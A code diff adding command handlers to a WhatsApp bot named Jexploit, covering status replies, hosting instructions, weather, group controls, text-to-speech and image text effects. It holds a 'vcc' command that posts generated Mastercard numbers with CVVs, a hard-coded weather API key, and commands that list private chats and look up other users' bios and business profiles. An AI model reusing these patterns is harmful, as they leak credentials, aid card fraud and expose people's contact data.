+        'https://files.catbox.moe/cg1edi.mp3'
+    ];
+    
+    const randomImageUrl = imageUrls[Math.floor(Math.random() * imageUrls.length)];
+    const randomAudioUrl = audioUrls[Math.floor(Math.random() * audioUrls.length)];
+    
+    // Send image with caption
+    await conn.sendMessage(
+        m.chat, 
+        { 
+            image: { url: randomImageUrl },
+            caption: `*🌹Hi. I am 👑 ${global.botname}, a friendly WhatsApp bot from Uganda 🇺🇬, created by Kevin tech. Don't worry, I'm still Alive☺🚀*\n\n*⏰ Uptime: ${serverUptime}*`
+        },
+        { quoted: m }
+    ).catch(err => {
+        console.error('Image failed:', err.message);
+        return conn.sendMessage(m.chat, {
+            text: `*🌹Hi. I am 👑 Jexploit, a friendly WhatsApp bot from Uganda 🇺🇬, created by Kevin tech. Don't worry, I'm still Alive☺🚀*\n\n*⏰ Uptime:${serverUptime}*`
+        }, { quoted: m });
+    });
+    
+    // Send audio as PTT
+    await sendPTT(conn, m.chat, randomAudioUrl, m);
+    
+    break;
+}
+case 'botinfo': {
+    const botInfo = `
+╭─ ⌬ Bot Info
+│ • Name     : ${global.botname}
+│ • Owner    : ${global.ownername}
+│ • Version  : ${global.versions}
+│ • ᴄᴍᴅs    : 100+
+│ • Developer: Kelvin tech
+│ • Runtime  : ${runtime(require('./lib/uptime').seconds())}
+╰─────────────`;
+
+    const imageUrls = [
+        "./start/lib/Media/Jexploit1.jpg", 
+        "./start/lib/Media/Jexploit2.jpg"
+    ];
+    
+    const audioUrls = [
+        'https://files.catbox.moe/zhr5m2.mp3',
+        'https://files.catbox.moe/yny58w.mp3',
+        'https://files.catbox.moe/ckie6b.m4a',
+        'https://files.catbox.moe/m1u0zl.opus',
+        'https://files.catbox.moe/cg1edi.mp3'
+    ];
+    
+    const randomImageUrl = imageUrls[Math.floor(Math.random() * imageUrls.length)];
+    const randomAudioUrl = audioUrls[Math.floor(Math.random() * audioUrls.length)];
+    
+    // Send image with caption
+    await conn.sendMessage(
+        m.chat, 
+        { 
+            image: { url: randomImageUrl },  
+            caption: `*🌹Hi. I am 👑 ${global.botname}, a friendly WhatsApp bot.*${botInfo}`
+        },
+        { quoted: m }
+    ).catch(err => {
+        console.error('Image failed:', err.message);
+        return conn.sendMessage(m.chat, {
+            text: `*🌹Hi. I am 👑 Jexploit, a friendly WhatsApp bot.*${botInfo}`
+        }, { quoted: m });
+    });
+    
+    // Send audio as PTT
+    await sendPTT(conn, m.chat, randomAudioUrl, m);
+    
+   
+}
+break
+case "bothosting": {
+try {
+        
+
+        const message = `
+*STEPS ON HOW TO DEPLOY A WHATSAPP BOT*
+First you need a GitHub account.
+Create one using the link:
+https://github.com/
+
+Secondly create a discord account.
+https://discord.com/login
+
+Once your done creating and verifying the two account, move over to the next step.
+
+*NEXT STEPS*
+Next step is to fork the bot repository. Click the link
+https://github.com/Kevintech-hub/Jexploit-Bot
+
+Then download the zip file.
+
+Now authorise your discord account then claim coins for 3days, each day u can claim 10 coins.
+
+
+https://bot-hosting.net/?aff=1454800083857051814
+
+*NOTE:* Some bot require larger server to process while. (25 coin)
+
+When your done creating a server (25 coin) open the server.
+
+Upload your bot code you have downloaded
+
+Start server Enjoy 😉
+        `.trim();
+
+        await conn.sendMessage(from, {
+            image: { url: 'https://files.catbox.moe/9sazwf.jpg' },
+            caption: message,
+            contextInfo: {
+                mentionedJid: [m.sender],
+                forwardingScore: 999,
+                isForwarded: true,
+                forwardedNewsletterMessageInfo: {
+                    newsletterJid: '120363401548261516@newsletter',
+                    newsletterName: '🪀『JEXPLOIT』🪀',
+                    serverMessageId: 143
+                }
+            }
+        }, { quoted: mek });
+
+    } catch (e) {
+        console.error("Support Cmd Error:", e);
+        reply(`⚠️ An error occurred:\n${e.message}`);
+    }
+}
+break
+case "serverinfo":
+case "stats":
+case "botstats": {
+    const start = performance.now();
+    const cpus = os.cpus();
+    const uptimeSeconds = os.uptime();
+    const muptime = runtime(require('./lib/uptime').seconds()).trim();
+    const uptimeDays = Math.floor(uptimeSeconds / 86400);
+    const uptimeHours = Math.floor((uptimeSeconds % 86400) / 3600);
+    const uptimeMinutes = Math.floor((uptimeSeconds % 3600) / 60);
+    const totalMem = os.totalmem();
+    const freeMem = os.freemem();
+    const usedMem = totalMem - freeMem;
+    const formattedUsedMem = formatSize(usedMem);
+    const formattedTotalMem = formatSize(totalMem);
+    const loadAverage = os.loadavg().map(avg => avg.toFixed(2)).join(", ");
+    const speed = (performance.now() - start).toFixed(3);
+    
+    const memPercent = ((usedMem / totalMem) * 100).toFixed(1);
+    
+    let totalIdle = 0, totalTick = 0;
+    const cpusInfo = cpus.map(cpu => {
+        let total = 0;
+        for (let type in cpu.times) {
+            total += cpu.times[type];
+        }
+        const idle = cpu.times.idle;
+        const usage = ((total - idle) / total) * 100;
+        totalIdle += idle;
+        totalTick += total;
+        return usage;
+    });
+    const avgCpuUsage = (cpusInfo.reduce((a, b) => a + b, 0) / cpusInfo.length).toFixed(1);
+    
+    const ramBarLength = 15;
+    const ramFilled = Math.round((usedMem / totalMem) * ramBarLength);
+    const ramBar = '█'.repeat(ramFilled) + '░'.repeat(ramBarLength - ramFilled);
+    
+    const cpuFilled = Math.round(avgCpuUsage / 6.7);
+    const cpuBar = '█'.repeat(Math.min(cpuFilled, ramBarLength)) + '░'.repeat(Math.max(0, ramBarLength - cpuFilled));
+    
+    const serverInfo = `🔹 SERVER STATISTICS 🔹
+    
+🔸 SYSTEM
+   CPU    : ${cpus[0].model.split('@')[0].trim()}
+   Cores  : ${cpus.length}
+   OS     : ${os.platform()} (${os.arch()})
+   
+🔸 PERFORMANCE
+   CPU    : ${avgCpuUsage}% ${cpuBar}
+   RAM    : ${memPercent}% ${ramBar}
+   Used   : ${formattedUsedMem} / ${formattedTotalMem}
+   Load   : ${loadAverage}
+   
+🔸 UPTIME
+   System : ${uptimeDays}d ${uptimeHours}h ${uptimeMinutes}m
+   Bot    : ${muptime}
+   Ping   : ${speed}ms
+   
+🔸 HOST
+   Name   : ${detectPlatform()}
+   
+🔹 ${global.wm || 'Vesper-Xmd'} 🔹`;
+
+    await reply(serverInfo);
+    
+}
+break
+case 'weather': {
+                      try {
+
+if (!text) return reply("provide a city/town name");
+
+const response = await fetch(`http://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=1ad47ec6172f19dfaf89eb3307f74785`);
+        const data = await response.json();
+
+console.log("Weather data:",data);
+
+        const cityName = data.name;
+        const temperature = data.main.temp;
+        const feelsLike = data.main.feels_like;
+        const minTemperature = data.main.temp_min;
+        const maxTemperature = data.main.temp_max;
+        const description = data.weather[0].description;
+        const humidity = data.main.humidity;
+        const windSpeed = data.wind.speed;
+        const rainVolume = data.rain ? data.rain['1h'] : 0;
+        const cloudiness = data.clouds.all;
+        const sunrise = new Date(data.sys.sunrise * 1000);
+        const sunset = new Date(data.sys.sunset * 1000);
+
+await m.reply(`❄️ Weather in ${cityName}
+
+🌡️ Temperature: ${temperature}°C
+📝 Description: ${description}
+❄️ Humidity: ${humidity}%
+🌀 Wind Speed: ${windSpeed} m/s
+🌧️ Rain Volume (last hour): ${rainVolume} mm
+☁️ Cloudiness: ${cloudiness}%
+🌄 Sunrise: ${sunrise.toLocaleTimeString()}
+🌅 Sunset: ${sunset.toLocaleTimeString()}`);
+
+} catch (e) { reply("Unable to find that location.") }
+  }
+break;
+case 'add2': {
+                if (!m.isGroup) return m.reply(mess.group)
+                if(!Access) return m.reply(mess.owner)
+                if (!m.isAdmin) return reply(mess.notadmin);
+                if (!m.isBotAdmin) return reply(mess.botadmin);
+                let blockwwww = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
+                await conn.groupParticipantsUpdate(m.chat, [blockwwww], 'add')
+         m.reply(mess.done)
+}
+break                 
+case "disp90days": { 
+ if (!m.isGroup) return reply (mess.group); 
+
+ if (!m.isAdmin) return reply(mess.notadmin);
+ if (!m.isBotAdmin) return reply(mess.botadmin);
+
+                     await conn.groupToggleEphemeral(m.chat, 90*24*3600); 
+ m.reply('Dissapearing messages successfully turned on for 90 days!'); 
+ } 
+ break;       
+case "dispoff": { 
+    if (!m.isGroup) return reply (mess.group); 
+
+    if (!m.isAdmin) return reply(mess.notadmin);
+    if (!m.isBotAdmin) return reply(mess.botadmin);
+                     await conn.groupToggleEphemeral(m.chat, 0); 
+ m.reply('Dissapearing messages successfully turned off!'); 
+}
+break;
+case "disp24hours": { 
+if (!m.isGroup) return reply (mess.group); 
+
+ if (!m.isAdmin) return reply(mess.notadmin);
+    if (!m.isBotAdmin) return reply(mess.botadmin);
+
+                     await conn.groupToggleEphemeral(m.chat, 1*24*3600); 
+ m.reply('Dissapearing messages successfully turned on for 24hrs!'); 
+ } 
+break
+case "dev":
+case "developer": {
+  try {
+    // Developer information (replace with your actual details)
+    const devInfo = {
+      name: "Kevin Tech",      // Developer name
+      number: "256742932677",  // Developer WhatsApp number (without + or @)
+      organization: "*JEXPLOIT DEVELOPMENT TEAM*",
+      note: `*BOT DEVELOPER & WEBSITE DESIGNER*\n*Legally wrong, ethically right.*\n*Kelvin Tech vs everyone ☠️*`
+    };
+
+    // Create vCard
+    const vcard = `BEGIN:VCARD
+VERSION:3.0
+FN:${devInfo.name}
+ORG:${devInfo.organization};
+TEL;type=CELL;type=VOICE;waid=${devInfo.number}:${devInfo.number}
+NOTE:${devInfo.note}
+END:VCARD`;
+
+    // Send as contact card
+    await conn.sendMessage(
+      m.chat, 
+      {
+        contacts: {
+          displayName: devInfo.name,
+          contacts: [{
+            displayName: devInfo.name,
+            vcard: vcard
+          }]
+        },
+        contextInfo: {
+          mentionedJid: [m.sender],
+          externalAdReply: {
+            title: `Developer Contact`,
+            body: `Contact ${devInfo.name} for support`,
+            thumbnail: fs.readFileSync('./start/lib/kelvin/dev.jpg'), // Your dev photo
+            mediaType: 1,
+            renderLargerThumbnail: true
+          }
+        }
+      },
+      { quoted: m }
+    );
+
+    // Also send text info as fallback
+    await conn.sendMessage(
+      m.chat,
+      { 
+        text: `👨‍💻 *Developer Information*\n\n` +
+              `• *Name:* ${devInfo.name}\n` +
+              `• *Contact:* wa.me/${devInfo.number}\n` +
+              `• *Role:* ${devInfo.note}\n` +
+              `• *Team:* ${devInfo.organization}`,
+              
+        mentions: [m.sender]
+      },
+      { quoted: m }
+    );
+
+  } catch (error) {
+    console.error('Error in dev command:', error);
+    reply(mess.error);
+  }
+}
+break
+case "say": {
+let text = args.join(" ");
+    if (!text) return reply("*Text needed!*");
+
+    try {
+      const ttsData = await googleTTS.getAllAudioBase64(text, {
+        lang: "en",
+        slow: false,
+        host: "https://translate.google.com",
+        timeout: 10000,
+      });
+
+      if (!ttsData.length) return reply("*Failed to generate TTS audio.*");
+
+      const tempFiles = [];
+      for (let i = 0; i < ttsData.length; i++) {
+        let filePath = `/tmp/tts_part${i}.mp3`;
+        fs.writeFileSync(filePath, Buffer.from(ttsData[i].base64, "base64"));
+        tempFiles.push(filePath);
+      }
+
+      
+      let mergedFile = "/tmp/tts_merged.mp3";
+      let ffmpegCommand = `ffmpeg -i "concat:${tempFiles.join('|')}" -acodec copy ${mergedFile}`;
+      exec(ffmpegCommand, async (err) => {
+        if (err) {
+          console.error("FFmpeg error:", err);
+          return reply("*Error merging audio files.*");
+        }
+
+        await conn.sendMessage(
+          m.chat,
+          {
+            audio: fs.readFileSync(mergedFile),
+            mimetype: "audio/mp4",
+            mp3: true,
+            fileName: "tts_audio.mp3",
+          },
+          { quoted: m }
+        );
+
+        tempFiles.forEach(file => fs.unlinkSync(file));
+        fs.unlinkSync(mergedFile);
+      });
+    } catch (error) {
+      console.error("Error in TTS Command:", error);
+      reply(mess.error);
+    }
+}
+break
+case "tinylink": {
+    if (!text) return reply(`*Example: ${prefix + command} https://github.com/Kevintech-hub/Jexploit-Bot*`);
+    
+    try {
+      const response = await axios.get(`https://tinyurl.com/api-create.php?url=${text}`);
+      reply(response.data);
+    } catch (error) {
+      console.error(error);
+      reply(mess.error);
+    }
+}
+break
+case "vcc": {
+const apiUrl = `${global.mess.siputzx}/api/tools/vcc-generator?type=MasterCard&count=5`;
+
+    try {
+      const response = await fetch(apiUrl);
+      const result = await response.json();
+
+      if (!result.status || !result.data || result.data.length === 0) {
+        return reply("❌ Unable to generate VCCs. Please try again later.");
+      }
+
+      let responseMessage = `🎴 *Generated VCCs* (Type: Mastercard and Count: 5):\n\n`;
+
+      result.data.forEach((card, index) => {
+        responseMessage += `#️⃣ *Card ${index + 1}:*\n`;
+        responseMessage += `🔢 *Card Number:* ${card.cardNumber}\n`;
+        responseMessage += `📅 *Expiration Date:* ${card.expirationDate}\n`;
+        responseMessage += `🧾 *Cardholder Name:* ${card.cardholderName}\n`;
+        responseMessage += `🔒 *CVV:* ${card.cvv}\n\n`;
+      });
+
+      reply(responseMessage);
+    } catch (error) {
+      console.error("Error fetching VCC data:", error);
+      reply(mess.error);
+    }
+}
+break
+case 'calculate':
+case 'calc':
+case 'math': {
+    if (!q) {
+        reply('Send an expression after the command.\nExample: .calculate (12 + 8) * 3 / 2')
+        break
+    }
+    try {
+        // let people type 5x5 or 5÷5 as well as 5*5 and 5/5
+        const expression = q.replace(/x/gi, '*').replace(/÷/g, '/')
+        const result = evaluate(expression)
+        reply(`🧮 *${q}* = *${result}*`)
+    } catch (err) {
+        reply("That's not a valid expression. Example: .calculate 25 * 4 - 10")
+    }
+    
+}
+break
+case "owner": {
+    try {
+        
+        // Get owner info from SQLite
+        const ownernumber = await db.get(botNumber, 'ownernumber', '256742932677');
+        const ownername = await db.get(botNumber, 'ownername', 'Owner');
+        
+        // Format the number
+        const cleanNumber = String(ownernumber).replace(/\D/g, '');
+        
+        // Create contact vcard
+        const ownerContact = [{
+            displayName: ownername,
+            vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${ownername}\nFN:${ownername}\nitem1.TEL;waid=${cleanNumber}:${cleanNumber}\nitem1.X-ABLabel:Mobile\nEND:VCARD`,
+        }];
+
+        // Send only the contact
+        await conn.sendMessage(
+            m.chat,
+            { 
+                contacts: { 
+                    displayName: `Owner Contact`, 
+                    contacts: ownerContact 
+                }
+            },
+            { quoted: m }
+        );
+        
+    } catch (error) {
+        console.error('Error sending owner contact:', error.message);
+        reply(mess.error);
+    }
+    
+}
+break
+case 'listpc': {
+    if (!Access) return reply(mess.owner)
+    const allChats = store.chats ? Object.values(store.chats.all()) : []
+    const privateChats = allChats.filter(chat => chat.id?.endsWith('@s.whatsapp.net'))
+
+    if (!privateChats.length) {
+        reply('No private chats found.')
+        break
+    }
+
+    let text = `📋 *Private Chats (${privateChats.length})*\n\n`
+    privateChats.forEach((chat, i) => {
+        const number = chat.id.split('@')[0]
+        const contact = store.contacts?.[chat.id]
+        const name = contact?.name || contact?.notify || contact?.verifiedName || 'Unknown'
+        text += `${i + 1}. ${name} — ${number}\n`
+    })
+
+    reply(text)
+    
+}
+break
+case 'getbisnis':
+case 'getbusiness': {
+    try {
+        let input = m.quoted ? m.quoted.sender : text || m.sender;
+        
+        if (!input) {
+            return reply(`⚠️ Please provide a phone number or reply to a message!\n\nUsage: *${prefix}getbusiness 256742932677*`);
+        }
+        
+        // Clean and format the number
+        input = input.replace(/[^0-9]/g, '');
+        
+        let target;
+        if (input.startsWith('0')) {
+            target = '256' + input.slice(1) + '@s.whatsapp.net';
+        } else if (input.length === 9) {
+            target = '256' + input + '@s.whatsapp.net';
+        } else if (input.length === 12 && input.startsWith('256')) {
+            target = input + '@s.whatsapp.net';
+        } else {
+            target = input + '@s.whatsapp.net';
+        }
+        
+        // Get business profile
+        const profile = await conn.getBusinessProfile(target);
+        
+        // Check if profile exists
+        if (!profile) {
+            return reply(`❌ No business profile found for this number.`);
+        }
+        
+        // Get name and profile picture
+        const name = await conn.getName(target).catch(() => 'Unknown');
+        const pfp = await conn.profilePictureUrl(target, 'image').catch(() => null);
+        
+        // Safely extract profile data
+        const desc = profile?.description || 'No description available';
+        const category = profile?.category || 'Not specified';
+        const website = profile?.website || 'Not provided';
+        const address = profile?.address || 'Not provided';
+        const email = profile?.email || 'Not provided';
+        
+        const caption = `📇 *BUSINESS PROFILE*\n\n` +
+            `👤 *Name:* ${name}\n` +
+            `🏢 *Category:* ${category}\n` +
+            `🌐 *Website:* ${website}\n` +
+            `📍 *Address:* ${address}\n` +
+            `✉️ *Email:* ${email}\n\n` +
+            `📝 *Description:*\n${desc}`;
+        
+        if (pfp) {
+            await conn.sendMessage(m.chat, {
+                image: { url: pfp },
+                caption: caption
+            }, { quoted: m });
+        } else {
+            await reply(caption);
+        }
+        
+    } catch (err) {
+        console.error('GetBusiness error:', err);
+        
+        if (err.message.includes('404')) {
+            reply(`❌ Business profile not found for this number.`);
+        } else {
+            reply(`❌ Failed to fetch business profile: ${err.message}`);
+        }
+    }
+    
+}
+break
+case "botstatus":
+case "stats": {
+    const used = process.memoryUsage();
+    const totalRam = os.totalmem();
+    const freeRam = os.freemem();
+    const usedRam = totalRam - freeRam;
+    const ramPercent = ((usedRam / totalRam) * 100).toFixed(1);
+    
+    const disk = await checkDiskSpace(process.cwd());
+    const diskUsed = disk.size - disk.free;
+    const diskPercent = ((diskUsed / disk.size) * 100).toFixed(1);
+    
+    const latencyStart = performance.now();
+    await reply("⏳ *Calculating System Info...*");
+    const latencyEnd = performance.now();
+    const ping = `${(latencyEnd - latencyStart).toFixed(2)} ms`;
+    
+    const botUptime = runtime(require('./lib/uptime').seconds());
+    const serverUptime = getServerUptime();
+    
+    const response = `
+╭──❖ 「 BOT STATUS 」 ❖──
+│
+🔸 *Ping*       : ${ping}
+🔸 *Bot Uptime* : ${botUptime}
+🔸 *Server Uptime* : ${serverUptime}
+│
+🔹 *RAM*        : ${formatSize(usedRam)} / ${formatSize(totalRam)} (${ramPercent}%)
+🔹 *Heap*       : ${formatSize(used.heapUsed)} / ${formatSize(used.heapTotal)}
+│
+🔸 *Disk*       : ${formatSize(diskUsed)} / ${formatSize(disk.size)} (${diskPercent}%)
+🔸 *Free Disk*  : ${formatSize(disk.free)}
+│
+🔹 *Platform*   : ${detectPlatform()}
+🔹 *Node*       : ${process.version}
+🔹 *CPU*        : ${os.cpus()[0].model.substring(0, 25)}...
+│
+╰────────────────────❖`;
+
+    await conn.sendMessage(m.chat, { text: response.trim() }, { quoted: m });
+    break;
+}
+case "getabout": {
+    if (!Access) return reply(mess.owner);
+    
+    let userId;
+    
+    // Check if replying to a message or providing a number
+    if (m.quoted) {
+        userId = m.quoted.sender;
+    } else if (text) {
+        // Format the number if provided
+        let cleanNumber = text.replace(/[^0-9]/g, '');
+        if (cleanNumber.startsWith('0')) {
+            cleanNumber = '256' + cleanNumber.slice(1);
+        }
+        userId = cleanNumber + '@s.whatsapp.net';
+    } else {
+        return reply('⚠️ Reply to a user or provide a phone number!\n\nUsage:\n• Reply to a message: *.getabout*\n• Provide number: *.getabout 256742932677*');
+    }
+
+    try {
+        // Fetch user's status/about
+        const { status, setAt } = await conn.fetchStatus(userId);
+        
+        if (!status) {
+            return reply(`❌ No about/bio found for @${userId.split('@')[0]}`, { mentions: [userId] });
+        }
+        
+        const formattedDate = moment(setAt).format("MMMM Do YYYY, h:mm:ss A");
+        
+        await conn.sendMessage(m.chat, { 
+            text: `📝 *ABOUT/BIO*\n\n👤 *User:* @${userId.split('@')[0]}\n📋 *Status:* "${status}"\n\n🕒 *Set at:* ${formattedDate}`,
+            mentions: [userId] 
+        }, { quoted: m });
+
+    } catch (error) {
+        console.error('Getabout error:', error);
+        
+        if (error.message.includes('404')) {
+            reply(`❌ No about/bio found for this user.`);
+        } else {
+            reply(`❌ Failed to fetch about: ${error.message}`);
+        }
+    }
+    
+}
+break
+case "smartphone":
+case "gsmarena": {
+    if (!text) return reply("*Please provide a query to search for smartphones.*");
+
+    try {
+      let result;
+      let success = false;
+      
+      // Try primary API first
+      try {
+        const apiUrl = `${global.mess.siputzx}/api/s/gsmarena?query=${encodeURIComponent(text)}`;
+        const response = await fetch(apiUrl);
+        result = await response.json();
+
+        if (result.status && result.data && result.data.length > 0) {
+          success = true;
+        } else {
+          throw new Error('Primary API returned no results');
+        }
+      } catch (primaryError) {
+        console.log('Primary API failed, trying fallback API...');
+        
+        // Fallback to new API
+        const fallbackUrl = `https://api.nexray.eu.cc/search/gsmarena?q=${encodeURIComponent(text)}`;
+        const fallbackResponse = await fetch(fallbackUrl);
+        const fallbackResult = await fallbackResponse.json();
+        
+        if (fallbackResult.status && fallbackResult.result && fallbackResult.result.length > 0) {
+          result = { status: true, data: fallbackResult.result };
+          success = true;
+        } else {
+          throw new Error('Fallback API also failed');
+        }
+      }
+
+      if (!success || !result.data || result.data.length === 0) {
+        return reply("*No results found. Please try another query.*");
+      }
+
+      const limitedResults = result.data.slice(0, 10);
+      let responseMessage = `*Top 10 Results for "${text}":*\n\n`;
+
+      for (let item of limitedResults) {
+        responseMessage += `📱 *Name:* ${item.name}\n`;
+        responseMessage += `📝 *Description:* ${item.description}\n`;
+        responseMessage += `🌐 [View Image](${item.thumbnail})\n\n`;
+      }
+
+      reply(responseMessage);
+    } catch (error) {
+      console.error('Error fetching results from GSMArena API:', error);
+      reply(mess.error);
+    }
+}
+break
+case "countryinfo": {
+const country = args.join(' ');
+    
+    if (!country) return reply("*Please provide a country name. Example: `.countryinfo Uganda*`");
+    
+    try {
+      const response = await fetch(`${global.mess.siputzx}/api/tools/countryInfo?name=${encodeURIComponent(country)}`);
+      const data = await response.json();
+      
+      if (!data.status || !data.data) {
+        return reply(`No information found for "${country}"`);
+      }
+      
+      const info = data.data;
+      
+      let message = `*Country Information: ${info.name}*\n\n`;
+      message += `Capital: ${info.capital || 'N/A'}\n`;
+      message += `Phone Code: ${info.phoneCode || 'N/A'}\n`;
+      message += `Continent: ${info.continent?.name || 'N/A'}\n`;
+      message += `Coordinates: ${info.coordinates?.latitude || 'N/A'}, ${info.coordinates?.longitude || 'N/A'}\n`;
+      message += `Area: ${info.area?.squareKilometers?.toLocaleString() || 'N/A'} km²\n`;
+      message += `Landlocked: ${info.landlocked ? 'Yes' : 'No'}\n`;
+      message += `Famous For: ${info.famousFor || 'N/A'}\n`;
+      message += `Government: ${info.constitutionalForm || 'N/A'}\n`;
+      message += `Currency: ${info.currency || 'N/A'}\n`;
+      message += `Driving Side: ${info.drivingSide || 'N/A'}\n`;
+      message += `Internet TLD: ${info.internetTLD || 'N/A'}\n`;
+      message += `ISO Code: ${info.isoCode?.alpha2?.toUpperCase() || 'N/A'}\n\n`;
+      
+      if (info.languages) {
+        message += `Languages:\n`;
+        if (info.languages.native?.length) message += `  Native: ${info.languages.native.join(', ')}\n`;
+        if (info.languages.codes?.length) message += `  Codes: ${info.languages.codes.join(', ')}\n`;
+      }
+      
+      if (info.neighbors?.length) {
+        message += `\nNeighboring Countries:\n`;
+        info.neighbors.slice(0, 3).forEach(neighbor => {
+          message += `  • ${neighbor.name}\n`;
+        });
+      }
+      
+      if (info.flag) {
+        await conn.sendMessage(m.chat, {
+          image: { url: info.flag },
+          caption: message
+        }, { quoted: m });
+      } else {
+        reply(message);
+      }
+      
+    } catch (error) {
+      console.error('Country info error:', error);
+      reply("Error fetching country information.");
+    }
+}
+break
+case "time": {
+    try {
+        const now = moment().tz(global.timezones || "Africa/Kampala");
+        const timeInfo = `
+⏰ *Current Bot Time* ⏰
+
+🌍 *Timezone:* ${now.format('z (Z)')}
+📅 *Date:* ${now.format('dddd, MMMM Do YYYY')}
+🕒 *Time:* ${now.format('h:mm:ss A')}
+🕛 *24-hour format:* ${now.format('HH:mm:ss')}
+📆 *Week Number:* ${now.format('WW')}
+⏳ *Day of Year:* ${now.format('DDD')}
+
+> ${global.wm || 'Jexploit Bot'}
+        `.trim();
+
+        await conn.sendMessage(m.chat, { text: timeInfo }, { quoted: m });
+
+    } catch (error) {
+        console.error('Error in time command:', error);
+        reply('❌ *Unable to fetch time information.*');
+    }
+    
+}
+// ===== EOHOT EFFECTS ============
+break
+case "glossysilver": {
+    try {
+        if (!text) return reply('Please provide text. Example: .glossysilver Hello World');
+        
+        let query = text.trim();
+        let res = await fetch(`https://api.giftedtech.co.ke/api/photooxy/glossy-silver?apikey=gifted&text=${encodeURIComponent(query)}`);
+        
+        if (!res.ok) {
+            throw new Error(`API request failed with status ${res.status}`);
+        }
+        
+        let json = await res.json();
+        
+        // Check if the response has the expected structure
+        if (json && json.success && json.result && json.result.image_url) {
+            await conn.sendMessage(m.chat, { 
+                image: { url: json.result.image_url },
+                caption: `✨ Glossy Silver Text: ${query}`
+            }, { quoted: m });
+        } else {
+            throw new Error('Invalid API response structure');
+        }
+    } catch (error) {
+        console.error('Error generating glossy silver text:', error);
+        reply(mess.error);
+    }
+}
+break
+case 'arting': {
+    if (!text) return reply('Provide text! Example: .arting girl wearing glasses');
+    await conn.sendMessage(m.chat, { react: { text: '✨', key: m.key }});
+    
+    try {
+        await conn.sendMessage(m.chat, { image: { url: `https://api.nekorinn.my.id/ai-img/arting?text=${text}` }, caption: `> ${global.wm}`}, { quoted: m });
+    } catch (err) {
+        console.log(err.message);
+        conn.sendMessage(m.chat, { react: { text: '❌', key: m.key }});
+        reply(mess.error);
+    }
+}  
+break   
+case "advancedglow": {
+let q = args.join(" ");
+    if (!q) {
+      return reply(`*Example: ${prefix}advancedglow Kevin*`);
+    }
+
+    const link = "https://en.ephoto360.com/advanced-glow-effects-74.html";
+
+    try {
+      let result = await ephoto(link, q);
+      await conn.sendMessage(
+        m.chat,
+        { image: { url: result }, caption: `> ${global.wm}` },
+        { quoted: m }
+      );
+    } catch (error) {
+      console.error("Error in advancedglow command:", error);
+      reply(mess.error);
+      }
+}
+break
+case "blackpinklogo": {
+    let q = args.join(" ");
+    if (!q) {
+      return reply(`*Example: ${prefix}blackpinklogo Kevin*`);
+    }
+
+    const link = "https://en.ephoto360.com/create-blackpink-logo-online-free-607.html";
+
+    try {
+      let result = await ephoto(link, q);
+      await conn.sendMessage(
+        m.chat,
+        { image: { url: result }, caption: `> ${global.wm}` },
+        { quoted: m }
+      );
+    } catch (error) {
+      console.error("Error in blackpinklogo command:", error);
+      reply("*An error occurred while generating the effect.*");
+    }
+}
+break
+case "blackpinkstyle": {
+    let q = args.join(" ");
+    if (!q) {
+      return reply(`*Example: ${prefix}blackpinkstyle Kevin*`);
+    }
+
+    const link = "https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html";
+
+    try {
+      let result = await ephoto(link, q);
+      await conn.sendMessage(
+        m.chat,
+        { image: { url: result }, caption: `> ${global.wm}` },
+        { quoted: m }
+      );
+    } catch (error) {
+      console.error("Error in blackpinkstyle command:", error);
+      reply("*An error occurred while generating the effect.*");
+    }
+}
+break
+case "cartoonstyle": {
+    let q = args.join(" ");
+    if (!q) {
+      return reply(`*Example: ${prefix}cartoonstyle Kevin*`);
+    }
+
+    const link = "https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html";
+
+    try {
+      let result = await ephoto(link, q);
+      await conn.sendMessage(
+        m.chat,
+        { image: { url: result }, caption: `> ${global.wm}` },
+        { quoted: m }
+      );
+    } catch (error) {
+      console.error("Error in cartoonstyle command:", error);
+      reply("*An error occurred while generating the effect.*");
+    }
+}
+break
+case "deadpool": {
+    let q = args.join(" ");
+    if (!q) {
+      return reply(`*Example: ${prefix}deadpool Kevin*`);
+    }
+
+    const link = "https://en.ephoto360.com/create-light-effects-green-neon-online-429.html";
+
+    try {
+      let result = await ephoto(link, q);
+      await conn.sendMessage(
+        m.chat,
+        { image: { url: result }, caption: `> ${global.wm}` },
+        { quoted: m }
+      );
+    } catch (error) {
+      console.error("Error in deadpool command:", error);
+      reply("*An error occurred while generating the effect.*");
+    }
+} 
+break
+case "effectclounds": {
+let q = args.join(" ");
+    if (!q) {
+      return reply(`*Example: ${prefix}effectclouds Kevin*`);
+    }
+
+    const link = "https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html";
+
+    try {
+      let result = await ephoto(link, q);
+      await conn.sendMessage(
+        m.chat,
+        { image: { url: result }, caption: `> ${global.wm}` },
+        { quoted: m }
+      );
+    } catch (error) {
+      console.error("Error in effectclouds command:", error);
+      reply("*An error occurred while generating the effect.*");
+    }
+}
+break
+case "flagtext": {
+let q = args.join(" ");
+    if (!q) {
+      return reply(`*Example: ${prefix}flagtext Kevin*`);
+    }
+
+    const link = "https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html";
+
+    try {
+      let result = await ephoto(link, q);
+      await conn.sendMessage(
+        m.chat,
+        { image: { url: result }, caption: `> ${global.wm}` },
+        { quoted: m }
+      );
+    } catch (error) {
+      console.error("Error in flagtext command:", error);
+      reply("*An error occurred while generating the effect.*");
+    }
+}
+break
+case "freecreate": {
+    let q = args.join(" ");
+    if (!q) {
+      return reply(`*Example: ${prefix}freecreate Kevin*`);
+    }
+
+    const link = "https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html";
+
+    try {
+      let result = await ephoto(link, q);
+      await conn.sendMessage(
+        m.chat,
+        { image: { url: result }, caption: `> ${global.wm}` },
+        { quoted: m }
+      );
+    } catch (error) {
+      console.error("Error in freecreate command:", error);
+      reply("*An error occurred while generating the effect.*");
+    }
+}
+break
+case "galaxystyle": {
+    let q = args.join(" ");
+    if (!q) {
+      return reply(`*Example: ${prefix}galaxystyle Kevin*`);
+    }
+
+    const link = "https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html";
+
+    try {
+      let result = await ephoto(link, q);
+      await conn.sendMessage(
+        m.chat,
+        { image: { url: result }, caption: `> ${global.wm}` },
+        { quoted: m }
+      );
+    } catch (error) {
+      console.error("Error in galaxystyle command:", error);
+      reply("*An error occurred while generating the effect.*");
+    }
+}
+break
